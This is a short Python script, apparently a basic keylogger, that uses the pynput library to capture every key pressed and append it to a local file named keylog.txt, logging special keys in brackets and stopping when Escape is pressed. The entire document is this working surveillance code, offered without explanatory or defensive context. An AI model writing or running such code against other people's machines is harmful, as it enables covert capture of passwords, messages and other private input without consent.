from pynput import keyboard

# Path to save keystrokes
log_file = "keylog.txt"

# Function to write keystrokes to file
def write_to_file(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            # Handle special keys
            f.write(f" [{key}] ")

# Listener callbacks
def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
